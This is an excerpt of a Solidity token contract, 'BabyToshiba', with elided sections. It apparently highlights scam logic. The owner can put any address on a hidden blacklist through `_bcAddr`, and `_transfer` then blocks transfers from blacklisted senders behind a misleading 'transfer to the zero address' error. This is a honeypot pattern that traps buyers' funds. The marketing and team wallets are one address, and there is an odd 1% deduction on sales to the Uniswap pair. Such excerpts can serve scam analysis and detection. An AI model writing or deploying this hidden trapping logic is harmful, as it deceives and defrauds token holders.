...
contract BabyToshiba is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0xE54405C8cedaFDfC9920327d368a49D9C69b7CEA); // Marketing Address
    address payable public teamWalletAddress = payable(0xE54405C8cedaFDfC9920327d368a49D9C69b7CEA); // Team Address
    ...
    mapping (address => bool) public bcAddr;
    ...
    function _bcAddr(address addr, bool isbc) public onlyOwner {
        bcAddr[addr] = isbc;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        require(!bcAddr[sender], "ERC20: transfer to the zero address");
        ...
        else
        {
            ...
            if (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) {
                ...
                if(recipient == uniswapPair) {
                    finalAmount  = finalAmount.sub(finalAmount.mul(1).div(100));
                }
            }
